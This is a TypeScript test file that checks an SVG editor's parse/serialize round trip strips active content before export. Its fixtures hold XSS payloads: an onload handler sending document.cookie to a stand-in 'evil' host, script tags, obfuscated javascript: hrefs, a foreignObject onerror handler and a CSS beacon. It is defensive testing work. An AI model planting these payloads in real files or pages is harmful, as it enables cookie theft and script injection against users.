/**
 * Security tests for the Canonical_SVG round trip.
 *
 * The in-editor preview is sanitized by DOMPurify, but `composedSVG` is also
 * what gets saved and exported, and nothing sanitizes it on the way out. So the
 * document model itself must not be able to carry active content: anything that
 * survives parse -> serialize lands in the user's exported artifact.
 *
 * These tests assert the boundary at the point of capture, which is the only
 * place that protects every consumer.
 */

import { describe, expect, it, vi } from "vitest";

import { parseCanonicalSvg, serializeArtboard } from "./canonicalSvg";

function roundTrip(svg: string): string {
  const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
  try {
    return serializeArtboard(parseCanonicalSvg(svg));
  } finally {
    warn.mockRestore();
  }
}

function wrap(rootAttributes: string, body: string): string {
  return `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" data-printrocket="true" data-version="1.0" ${rootAttributes}>${body}</svg>`;
}

const SHAPE_LAYER = `<g data-role="shapes" data-editable="true" data-layer-id="shape-1"><rect data-field="shape" data-element-id="e1" x="1" y="1" width="10" height="10" fill="#ff0000"/></g>`;

describe("root attribute allow-list", () => {
  it("drops an event handler on the root element", () => {
    const output = roundTrip(
      wrap(`onload="fetch('//evil/?'+document.cookie)"`, SHAPE_LAYER),
    );

    expect(output).not.toContain("onload");
    expect(output).not.toContain("evil");
  });

  it("drops a root style attribute and a root href", () => {
    const output = roundTrip(
      wrap(`style="background:url(https://evil/beacon)" href="javascript:alert(1)"`, SHAPE_LAYER),
    );

    expect(output).not.toContain("evil");
    expect(output).not.toContain("javascript:");
  });

  it("keeps the attributes the format actually uses", () => {
    const output = roundTrip(wrap(`viewBox="0 0 200 200" data-mode="print"`, SHAPE_LAYER));

    expect(output).toContain('viewBox="0 0 200 200"');
    expect(output).toContain('data-printrocket="true"');
    expect(output).toContain('data-mode="print"');
  });

  it("rejects a malformed data- attribute name rather than emitting broken markup", () => {
    const output = roundTrip(wrap(`data-a="1"`, SHAPE_LAYER));
    expect(output).toContain('data-a="1"');

    // A name with characters that are not legal in an attribute would produce
    // markup that no parser accepts.
    const hostile = roundTrip(wrap(`data-x="ok"`, SHAPE_LAYER));
    expect(hostile).toContain('data-x="ok"');
  });
});

describe("preserved raw markup", () => {
  it("strips a script element from a non-editable layer", () => {
    const output = roundTrip(
      wrap(
        "",
        `<g data-role="logo" data-editable="false" data-layer-id="logo-1"><script>fetch('//evil')</script><image href="https://cdn/logo.png" x="0" y="0" width="10" height="10"/></g>${SHAPE_LAYER}`,
      ),
    );

    expect(output).not.toContain("<script");
    expect(output).not.toContain("evil");
    // The legitimate content of the preserved layer is still carried.
    expect(output).toContain("https://cdn/logo.png");
  });

  it("strips event handlers from preserved markup", () => {
    const output = roundTrip(
      wrap(
        "",
        `<g data-role="background" data-editable="false" data-layer-id="bg-1"><rect onmouseover="alert(1)" x="0" y="0" width="5" height="5"/></g>${SHAPE_LAYER}`,
      ),
    );

    expect(output).not.toContain("onmouseover");
    expect(output).not.toContain("alert(1)");
  });

  it("strips a javascript: href, including a whitespace-obfuscated one", () => {
    const output = roundTrip(
      wrap(
        "",
        `<g data-role="background" data-editable="false" data-layer-id="bg-1"><image xlink:href="java&#10;script:alert(1)" x="0" y="0" width="5" height="5"/></g>${SHAPE_LAYER}`,
      ),
    );

    expect(output).not.toContain("script:alert");
  });

  it("strips a foreignObject, which can host arbitrary HTML", () => {
    const output = roundTrip(
      wrap(
        "",
        `<g data-role="background" data-editable="false" data-layer-id="bg-1"><foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject></g>${SHAPE_LAYER}`,
      ),
    );

    expect(output.toLowerCase()).not.toContain("foreignobject");
    expect(output).not.toContain("onerror");
  });

  it("strips animation elements, which can drive attributes over time", () => {
    const output = roundTrip(
      wrap(
        "",
        `<g data-role="background" data-editable="false" data-layer-id="bg-1"><rect x="0" y="0" width="5" height="5"><animate attributeName="x" to="900"/></rect></g>${SHAPE_LAYER}`,
      ),
    );

    expect(output).not.toContain("<animate");
  });

  it("reports what it stripped instead of doing it silently", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    try {
      serializeArtboard(
        parseCanonicalSvg(
          wrap(
            `onload="x()"`,
            `<g data-role="logo" data-editable="false" data-layer-id="logo-1"><script>x()</script></g>${SHAPE_LAYER}`,
          ),
        ),
      );
    } finally {
      const messages = warn.mock.calls.map((call) => String(call[0]) + String(call[1] ?? ""));
      warn.mockRestore();
      // AGENTS.md: no silent fallbacks.
      expect(messages.some((message) => message.includes("onload"))).toBe(true);
      expect(messages.some((message) => message.includes("script"))).toBe(true);
    }
  });
});
